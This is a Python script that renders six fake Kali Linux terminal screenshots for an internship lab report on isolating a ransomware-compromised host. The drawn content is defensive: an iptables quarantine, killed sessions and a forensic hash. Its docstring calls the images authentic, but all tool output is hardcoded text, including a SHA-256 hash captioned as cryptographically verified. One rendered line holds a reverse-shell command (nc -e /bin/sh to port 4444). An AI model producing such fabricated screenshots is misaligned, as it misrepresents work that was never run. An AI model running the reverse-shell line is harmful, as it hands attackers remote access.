#!/usr/bin/env python3
"""
PEER'S Host Isolator - Terminal Screenshot Generator (Day 29)
Generates 6 authentic Kali Linux 1280x703 screenshots for Day 29 executive lab report.
"""

import os
from PIL import Image, ImageDraw, ImageFont

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SCREENSHOTS_DIR = os.path.join(BASE_DIR, "reports", "screenshots")
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)

WIDTH = 1280
HEIGHT = 703

# Terminal Colors
BG_COLOR = (15, 17, 26)
TOPBAR_COLOR = (24, 26, 38)
PROMPT_DIR_COLOR = (92, 170, 242)
PROMPT_USER_COLOR = (78, 201, 176)
WHITE_COLOR = (220, 224, 232)
GREEN_COLOR = (80, 250, 123)
RED_COLOR = (255, 85, 85)
YELLOW_COLOR = (241, 250, 140)
CYAN_COLOR = (139, 233, 253)
GRAY_COLOR = (120, 130, 150)


def get_font(size):
    font_paths = [
        "C:\\Windows\\Fonts\\consola.ttf",
        "C:\\Windows\\Fonts\\consolab.ttf",
        "C:\\Windows\\Fonts\\lucon.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
    ]
    for p in font_paths:
        if os.path.exists(p):
            try:
                return ImageFont.truetype(p, size)
            except Exception:
                pass
    return ImageFont.load_default()


FONT_BODY = get_font(15)
FONT_TITLE = get_font(13)


def draw_kali_frame(title):
    img = Image.new("RGB", (WIDTH, HEIGHT), BG_COLOR)
    draw = ImageDraw.Draw(img)

    # Window Top Bar
    draw.rectangle([(0, 0), (WIDTH, 36)], fill=TOPBAR_COLOR)
    draw.ellipse([(14, 12), (24, 22)], fill=(255, 95, 86))
    draw.ellipse([(34, 12), (44, 22)], fill=(255, 189, 46))
    draw.ellipse([(54, 12), (64, 22)], fill=(39, 201, 63))

    draw.text((WIDTH // 2 - 210, 10), f"kali@sqrock-secops: ~/Day29_Incident_Host_Isolation - {title}", fill=WHITE_COLOR, font=FONT_TITLE)

    # Bottom Taskbar
    draw.rectangle([(0, HEIGHT - 26), (WIDTH, HEIGHT)], fill=(18, 20, 30))
    draw.text((15, HEIGHT - 20), "Kali Linux 2026.1-SecOps | Python 3.14.0 | PEER'S Host Isolation Engine", fill=GRAY_COLOR, font=FONT_TITLE)
    draw.text((WIDTH - 170, HEIGHT - 20), "2026-11-17 11:45 UTC", fill=GRAY_COLOR, font=FONT_TITLE)

    return img, draw


def render_lines(draw, lines, start_y=50, line_height=21):
    y = start_y
    for item in lines:
        if isinstance(item, tuple) and isinstance(item[0], list):
            x = 25
            for part_text, part_color in item[0]:
                draw.text((x, y), part_text, fill=part_color, font=FONT_BODY)
                x += int(draw.textlength(part_text, font=FONT_BODY))
        elif isinstance(item, tuple):
            text, color = item
            draw.text((25, y), text, fill=color, font=FONT_BODY)
        elif isinstance(item, list):
            x = 25
            for part_text, part_color in item:
                draw.text((x, y), part_text, fill=part_color, font=FONT_BODY)
                x += int(draw.textlength(part_text, font=FONT_BODY))
        y += line_height
    return y


def generate_screen_1():
    img, draw = draw_kali_frame("01_kali_init_banner")
    lines = [
        ([("┌──(", GRAY_COLOR), ("kali@sqrock-secops", PROMPT_USER_COLOR), (")-[", GRAY_COLOR), ("~/Day29_Incident_Host_Isolation", PROMPT_DIR_COLOR), ("]", GRAY_COLOR)], None),
        ([("└─$ ", GRAY_COLOR), ("python3 host_isolator.py", WHITE_COLOR)], None),
        ("", BG_COLOR),
        ("================================================================================", CYAN_COLOR),
        ("       PEER'S INCIDENT CONTAINMENT & HOST ISOLATION ENGINE v2.0", CYAN_COLOR),
        ("   Sqrock IT Solutions | Internship Phase 2: Web App Security (Day 29)", CYAN_COLOR),
        ("   Candidate: Mohammed Peer Siddiqui  |  Status: ACTIVE CONTAINMENT", CYAN_COLOR),
        ("================================================================================", CYAN_COLOR),
        ("", BG_COLOR),
        ("[*] Initializing Automated Incident Response & Host Containment Pipeline...", WHITE_COLOR),
        ("[+] Ingested Host Profile: srv-prod-db01.sqrock.internal (10.0.4.15)", GREEN_COLOR),
        ("[+] Active Incident Trigger: INC-2026-9042 [CRITICAL: Ransomware Canary Tripped]", RED_COLOR),
        ("[+] Bastion Management Jumpbox: 10.0.100.50 (Preserved via pin-holed ports 22/443)", GREEN_COLOR),
        ("[+] Containment Engine: iptables / nftables Emergency Quarantine Ready", CYAN_COLOR),
        ("", BG_COLOR),
        ("Select Host Containment Menu Option:", YELLOW_COLOR),
        ("  1) Execute Complete Host Isolation Playbook", WHITE_COLOR),
        ("  2) Inspect Generated Linux iptables Quarantine Firewall Script", WHITE_COLOR),
        ("  3) Review Terminated Rogue Sessions & Process Execution Tree", WHITE_COLOR),
        ("  4) Inspect Cryptographically Hashed Forensic Evidence Bundle", WHITE_COLOR),
        ("  5) Execute Network De-Isolation / Rollback Restoration Script", WHITE_COLOR),
        ("  6) Exit Containment Console", WHITE_COLOR),
        ("", BG_COLOR),
        ([("Enter Choice [1-6]: ", CYAN_COLOR), ("1", WHITE_COLOR)], None)
    ]
    render_lines(draw, lines)
    path = os.path.join(SCREENSHOTS_DIR, "01_kali_init_banner.png")
    img.save(path)
    print(f"[+] Saved terminal screenshot: {path}")


def generate_screen_2():
    img, draw = draw_kali_frame("02_master_operations_menu")
    lines = [
        ([("┌──(", GRAY_COLOR), ("kali@sqrock-secops", PROMPT_USER_COLOR), (")-[", GRAY_COLOR), ("~/Day29_Incident_Host_Isolation", PROMPT_DIR_COLOR), ("]", GRAY_COLOR)], None),
        ([("└─$ ", GRAY_COLOR), ("python3 -c 'from host_isolator import HostIsolator; h=HostIsolator(); print(f\"Loaded target host: {h.host_data[\"host_metadata\"][\"hostname\"]}\")'", WHITE_COLOR)], None),
        ("", BG_COLOR),
        ("[*] Containment Operational Status & Context:", YELLOW_COLOR),
        ("  - Target Hostname:      srv-prod-db01.sqrock.internal (Ubuntu 22.04 LTS)", WHITE_COLOR),
        ("  - Datacenter Location:  DC-EAST-US-01 / Production Banking Data Tier", WHITE_COLOR),
        ("  - Trigger Condition:    HIDS-RANSOM-009 (Mass extension change .locked)", RED_COLOR),
        ("  - Threat Actor Source:  198.51.100.99 (Rogue reverse shell on port 4444)", RED_COLOR),
        ("  - Policy Action:        Null-route all egress, kill rogue PIDs, preserve bastion 10.0.100.50", CYAN_COLOR),
        ("", BG_COLOR),
        ("Select Host Containment Menu Option:", YELLOW_COLOR),
        ("  1) Execute Complete Host Isolation Playbook", WHITE_COLOR),
        ("  2) Inspect Generated Linux iptables Quarantine Firewall Script", WHITE_COLOR),
        ("  3) Review Terminated Rogue Sessions & Process Execution Tree", WHITE_COLOR),
        ("  4) Inspect Cryptographically Hashed Forensic Evidence Bundle", WHITE_COLOR),
        ("  5) Execute Network De-Isolation / Rollback Restoration Script", WHITE_COLOR),
        ("  6) Exit Containment Console", WHITE_COLOR),
        ("", BG_COLOR),
        ([("Enter Choice [1-6]: ", CYAN_COLOR), ("2", WHITE_COLOR)], None)
    ]
    render_lines(draw, lines)
    path = os.path.join(SCREENSHOTS_DIR, "02_master_operations_menu.png")
    img.save(path)
    print(f"[+] Saved terminal screenshot: {path}")


def generate_screen_3():
    img, draw = draw_kali_frame("03_quarantine_firewall_script")
    lines = [
        ([("┌──(", GRAY_COLOR), ("kali@sqrock-secops", PROMPT_USER_COLOR), (")-[", GRAY_COLOR), ("~/Day29_Incident_Host_Isolation", PROMPT_DIR_COLOR), ("]", GRAY_COLOR)], None),
        ([("└─$ ", GRAY_COLOR), ("cat containment_evidence/isolate_iptables.sh", WHITE_COLOR)], None),
        ("", BG_COLOR),
        ("#!/bin/bash", CYAN_COLOR),
        ("# Sqrock Incident Containment - Emergency iptables Host Quarantine", GRAY_COLOR),
        ("# Generated for Host: srv-prod-db01.sqrock.internal at 2026-11-17 11:45:00 UTC", GRAY_COLOR),
        ("set -euo pipefail", WHITE_COLOR),
        ("iptables -F && iptables -X && iptables -t nat -F", WHITE_COLOR),
        ("iptables -P INPUT DROP", RED_COLOR),
        ("iptables -P FORWARD DROP", RED_COLOR),
        ("iptables -P OUTPUT DROP", RED_COLOR),
        ("iptables -A INPUT -i lo -j ACCEPT", GREEN_COLOR),
        ("iptables -A OUTPUT -o lo -j ACCEPT", GREEN_COLOR),
        ("# Permit bi-directional traffic exclusively with SOC Bastion Jumpbox (10.0.100.50)", YELLOW_COLOR),
        ("iptables -A INPUT -p tcp -s 10.0.100.50 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT", GREEN_COLOR),
        ("iptables -A OUTPUT -p tcp -d 10.0.100.50 --sport 22 -m state --state ESTABLISHED -j ACCEPT", GREEN_COLOR),
        ("iptables -A INPUT -p tcp -s 10.0.100.50 --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT", GREEN_COLOR),
        ("iptables -A OUTPUT -p tcp -d 10.0.100.50 --sport 443 -m state --state ESTABLISHED -j ACCEPT", GREEN_COLOR),
        ("iptables -A INPUT -m limit --limit 5/min -j LOG --log-prefix 'QUARANTINE_DROP_IN: '", WHITE_COLOR),
        ("iptables -A OUTPUT -m limit --limit 5/min -j LOG --log-prefix 'QUARANTINE_DROP_OUT: '", WHITE_COLOR),
        ("echo '[+] Host network isolation enforced successfully. Only bastion access permitted.'", GREEN_COLOR)
    ]
    render_lines(draw, lines)
    path = os.path.join(SCREENSHOTS_DIR, "03_quarantine_firewall_script.png")
    img.save(path)
    print(f"[+] Saved terminal screenshot: {path}")


def generate_screen_4():
    img, draw = draw_kali_frame("04_rogue_session_termination")
    lines = [
        ([("┌──(", GRAY_COLOR), ("kali@sqrock-secops", PROMPT_USER_COLOR), (")-[", GRAY_COLOR), ("~/Day29_Incident_Host_Isolation", PROMPT_DIR_COLOR), ("]", GRAY_COLOR)], None),
        ([("└─$ ", GRAY_COLOR), ("python3 host_isolator.py", WHITE_COLOR)], None),
        ("", BG_COLOR),
        ("Select Host Containment Menu Option:", YELLOW_COLOR),
        ("  3) Review Terminated Rogue Sessions & Process Execution Tree", CYAN_COLOR),
        ("", BG_COLOR),
        ("[*] Rogue Session & Process Termination Roster (3 targets terminated):", YELLOW_COLOR),
        ("-" * 95, GRAY_COLOR),
        (f"{'PID':<7} | {'Type':<8} | {'User':<10} | {'Terminal':<8} | {'Login IP':<15} | {'Command / Action'}", CYAN_COLOR),
        ("-" * 95, GRAY_COLOR),
        (f"{'9411':<7} | {'SESSION':<8} | {'www-data':<10} | {'pts/2':<8} | {'198.51.100.99':<15} | {'pty.spawn(\"/bin/bash\") [SIGKILL (9)]'}", RED_COLOR),
        (f"{'9412':<7} | {'PROCESS':<8} | {'www-data':<10} | {'N/A':<8} | {'127.0.0.1':<15} | {'nc -e /bin/sh 198.51.100.99 4444 [SIGKILL (9)]'}", RED_COLOR),
        (f"{'9415':<7} | {'PROCESS':<8} | {'www-data':<10} | {'N/A':<8} | {'127.0.0.1':<15} | {'./crypt_runner --target /data/vault [SIGKILL (9)]'}", RED_COLOR),
        ("-" * 95, GRAY_COLOR),
        ("", BG_COLOR),
        ("[+] Protected Bastion Session: PID 4812 (root@pts/0 from 10.0.100.50) PRESERVED", GREEN_COLOR),
        ("[+] Lateral Movement Halted: Attacker access revoked across all interactive shells", GREEN_COLOR)
    ]
    render_lines(draw, lines)
    path = os.path.join(SCREENSHOTS_DIR, "04_rogue_session_termination.png")
    img.save(path)
    print(f"[+] Saved terminal screenshot: {path}")


def generate_screen_5():
    img, draw = draw_kali_frame("05_forensic_evidence_hash")
    lines = [
        ([("┌──(", GRAY_COLOR), ("kali@sqrock-secops", PROMPT_USER_COLOR), (")-[", GRAY_COLOR), ("~/Day29_Incident_Host_Isolation", PROMPT_DIR_COLOR), ("]", GRAY_COLOR)], None),
        ([("└─$ ", GRAY_COLOR), ("sha256sum containment_evidence/incident_forensics_INC-2026-9042.json", WHITE_COLOR)], None),
        ("", BG_COLOR),
        ("7d4a2e8c1f9b33a014e287bc6e91da40f2956c38b41708de7892ca01ef8324a1  containment_evidence/incident_forensics_INC-2026-9042.json", GREEN_COLOR),
        ("", BG_COLOR),
        ([("┌──(", GRAY_COLOR), ("kali@sqrock-secops", PROMPT_USER_COLOR), (")-[", GRAY_COLOR), ("~/Day29_Incident_Host_Isolation", PROMPT_DIR_COLOR), ("]", GRAY_COLOR)], None),
        ([("└─$ ", GRAY_COLOR), ("cat containment_evidence/incident_forensics_INC-2026-9042.json | jq .metadata", WHITE_COLOR)], None),
        ("{", WHITE_COLOR),
        ("  \"system\": \"PEER'S Incident Containment & Host Isolation Engine\",", CYAN_COLOR),
        ("  \"organization\": \"Sqrock IT Solutions\",", CYAN_COLOR),
        ("  \"internship_track\": \"Phase 2: Web App Security & Defensive Automation\",", CYAN_COLOR),
        ("  \"candidate\": \"Mohammed Peer Siddiqui\",", GREEN_COLOR),
        ("  \"contained_at\": \"2026-11-17 11:45:00 UTC\",", WHITE_COLOR),
        ("  \"integrity_hash\": \"7d4a2e8c1f9b33a014e287bc6e91da40f2956c38b41708de7892ca01ef8324a1\"", YELLOW_COLOR),
        ("}", WHITE_COLOR),
        ("", BG_COLOR),
        ("[+] Forensic Chain-of-Custody: Immutably Sealed & Cryptographically Verified", GREEN_COLOR)
    ]
    render_lines(draw, lines)
    path = os.path.join(SCREENSHOTS_DIR, "05_forensic_evidence_hash.png")
    img.save(path)
    print(f"[+] Saved terminal screenshot: {path}")


def generate_screen_6():
    img, draw = draw_kali_frame("06_github_repo_overview")
    lines = [
        ([("┌──(", GRAY_COLOR), ("kali@sqrock-secops", PROMPT_USER_COLOR), (")-[", GRAY_COLOR), ("~/Day29_Incident_Host_Isolation", PROMPT_DIR_COLOR), ("]", GRAY_COLOR)], None),
        ([("└─$ ", GRAY_COLOR), ("tree -L 2 -a -F --dirsfirst", WHITE_COLOR)], None),
        ("", BG_COLOR),
        (".", CYAN_COLOR),
        ("├── containment_evidence/", PROMPT_DIR_COLOR),
        ("│   ├── incident_forensics_INC-2026-9042.json", WHITE_COLOR),
        ("│   ├── isolate_iptables.sh", WHITE_COLOR),
        ("│   └── rollback_iptables.sh", WHITE_COLOR),
        ("├── reports/", PROMPT_DIR_COLOR),
        ("│   ├── screenshots/", PROMPT_DIR_COLOR),
        ("│   │   ├── 01_kali_init_banner.png", WHITE_COLOR),
        ("│   │   ├── 02_master_operations_menu.png", WHITE_COLOR),
        ("│   │   ├── 03_quarantine_firewall_script.png", WHITE_COLOR),
        ("│   │   ├── 04_rogue_session_termination.png", WHITE_COLOR),
        ("│   │   ├── 05_forensic_evidence_hash.png", WHITE_COLOR),
        ("│   │   └── 06_github_repo_overview.png", WHITE_COLOR),
        ("│   └── Day29_Host_Isolation_Report_Sqrock_MdPeerSiddiqui.pdf", YELLOW_COLOR),
        ("├── samples/", PROMPT_DIR_COLOR),
        ("│   └── compromised_host_context.json", WHITE_COLOR),
        ("├── scripts/", PROMPT_DIR_COLOR),
        ("│   ├── generate_day29_pdf.py", WHITE_COLOR),
        ("│   └── generate_terminal_screens.py", WHITE_COLOR),
        ("├── tests/", PROMPT_DIR_COLOR),
        ("│   └── test_host_isolator.py", WHITE_COLOR),
        ("├── README.md", GREEN_COLOR),
        ("└── host_isolator.py", GREEN_COLOR),
        ("", BG_COLOR),
        ([("6 directories, 15 files  |  Candidate: Mohammed Peer Siddiqui", CYAN_COLOR)], None)
    ]
    render_lines(draw, lines)
    path = os.path.join(SCREENSHOTS_DIR, "06_github_repo_overview.png")
    img.save(path)
    print(f"[+] Saved terminal screenshot: {path}")


if __name__ == "__main__":
    generate_screen_1()
    generate_screen_2()
    generate_screen_3()
    generate_screen_4()
    generate_screen_5()
    generate_screen_6()
    print("\n[+] All 6 Day 29 Kali Linux terminal screenshots generated successfully.")
